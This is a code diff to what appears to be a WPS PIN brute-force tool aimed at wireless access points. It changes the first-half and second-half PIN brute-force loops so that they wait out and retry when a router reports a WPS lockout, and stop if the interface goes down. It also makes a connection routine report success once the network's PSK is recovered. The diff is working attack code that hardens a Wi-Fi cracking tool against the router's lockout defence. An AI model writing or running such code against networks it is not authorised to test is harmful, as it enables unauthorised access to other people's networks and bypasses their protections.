@@ -891,7 +891,7 @@ class Companion:
                 time.sleep(timeout_val)
                 continue
 
-            return False
+            return self.connection_status.status == 'GOT_PSK'
 
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False, null_pin=False):
@@ -960,9 +960,20 @@ class Companion:
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
         checksum = self.generator.checksum
         while int(f_half) < 10000:
+            if not ifaceUpCheck(self.interface):
+                RealtimeLogger.err(f'Interface {self.interface} is no longer UP. Aborting bruteforce.')
+                return False
+
             t = int(f_half + '000')
             pin = '{}000{}'.format(f_half, checksum(t))
             self.single_connection(bssid, pin)
+
+            if self.connection_status.is_locked:
+                timeout_val = getattr(args, 'timeout', 60)
+                RealtimeLogger.warn(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {timeout_val}s…')
+                time.sleep(timeout_val)
+                continue
+
             if self.connection_status.isFirstHalfValid():
                 RealtimeLogger.ok(f'First half found: {f_half}')
                 return f_half
@@ -979,9 +990,20 @@ class Companion:
     def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
         checksum = self.generator.checksum
         while int(s_half) < 1000:
+            if not ifaceUpCheck(self.interface):
+                RealtimeLogger.err(f'Interface {self.interface} is no longer UP. Aborting bruteforce.')
+                return False
+
             t = int(f_half + s_half)
             pin = '{}{}{}'.format(f_half, s_half, checksum(t))
             self.single_connection(bssid, pin)
+
+            if self.connection_status.is_locked:
+                timeout_val = getattr(args, 'timeout', 60)
+                RealtimeLogger.warn(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {timeout_val}s…')
+                time.sleep(timeout_val)
+                continue
+
             if self.connection_status.last_m_message > 6:
                 RealtimeLogger.ok(f'Second half found: {s_half}')
                 return pin
